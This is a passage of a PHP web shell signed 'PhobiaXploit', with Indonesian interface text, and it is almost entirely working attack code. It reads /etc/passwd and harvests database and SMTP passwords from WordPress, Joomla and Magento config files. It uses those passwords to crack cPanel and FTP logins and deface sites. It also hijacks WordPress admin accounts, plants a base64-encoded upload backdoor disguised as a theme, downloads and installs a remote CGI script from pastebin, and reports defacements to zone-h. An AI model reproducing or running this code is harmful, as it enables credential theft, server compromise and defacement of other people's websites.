                                            $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>PhobiaXploit</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/^[client]$/", $ambil)) {
                    preg_match("/password=(.*?)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    } else {
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'cpftp_auto') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                            //
                        } else {
                            echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                            $ftp_conn = ftp_connect($ip);
                            $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
                            if((!$ftp_login) || (!$ftp_conn)) {
                                echo "[+] <font color=red>Login Gagal</font><br><br>";
                            } else {
                                echo "[+] <font color=lime>Login Sukses</font><br>";
                                $fi = htmlspecialchars($_POST['file_deface']);
                                $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
                                if($deface) {
                                    $i++;
                                    echo "[+] <font color=lime>Deface Sukses</font><br>";
                                    if(function_exists('posix_getpwuid')) {
                                        $domain_cp = file_get_contents("/etc/named.conf");
                                        if($domain_cp == '') {
                                            echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                        } else {
                                            preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                            foreach($domains_cp[1] as $dj) {
                                                $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                $user_cp_url = $user_cp_url['name'];
                                                if($user_cp_url == $ucp) {
                                                    echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                    }
                                } else {
                                    echo "[-] <font color=red>Deface Gagal</font><br><br>";
                                }
                            }
                            //echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses deface ".$i." Cpanel by <font color=lime>PhobiaXploit</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        Filename: <br>
        <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
        Deface Page: <br>
        <input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Hajar'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
                echo "SMTP port: <font color=lime>$smtp_port</font><br>";
                echo "SMTP user: <font color=lime>$smtp_user</font><br>";
                echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked By PhobiaXploit' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'zone-h') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='PhobiaXploit'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
} elseif($_GET['do'] == 'cgi') {
    $cgi_dir = mkdir('idx_cgi', 0755);
    $file_cgi = "idx_cgi/cgi.izo";
    $isi_htcgi = "AddHandler cgi-script .izo";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, $cgi_script);
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
    ob_start();
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = getsource("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
} elseif($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')) {
        echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
            echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            echo "<center><font color=red>gagal buat file adminer</font></center>";
        }
    }
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "PhobiaXploitt";
        $pass = "PhobiaXploitt";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=lime>$user</font><br>";
                        echo "[+] password: <font color=lime>$pass</font><br><br>";
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='TOucH by 99Syndicate' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "PhobiaXploitt";
        $pass = "PhobiaXploitt";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface V.2</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by PhobiaXploit' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form></center>";
    }
} elseif($_GET['do'] == 'network') {
    echo "<form method='post'>
    <u>Bind Port:</u> <br>
    PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
    <input type='submit' name='sub_bp' value='>>'>
    </form>
    <form method='post'>
